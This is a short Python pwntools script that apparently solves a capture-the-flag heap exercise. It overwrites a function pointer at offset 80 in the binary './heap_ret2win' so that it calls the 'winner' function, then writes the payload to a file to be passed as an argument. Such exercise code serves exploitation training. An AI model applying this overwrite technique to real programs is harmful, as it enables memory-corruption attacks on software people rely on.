from pwn import *

# Binary filename
exe = './heap_ret2win'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Offset to overwrite fp so we can ret2win (found with GDB)
offset = 80

# Build the payload
payload = flat({
    offset: elf.functions.winner
})

# We can't send null bytes as argv, so just write the payload to file:
write('payload', payload)

# Then in terminal, run:
print('./heap_ret2win $(cat payload)')
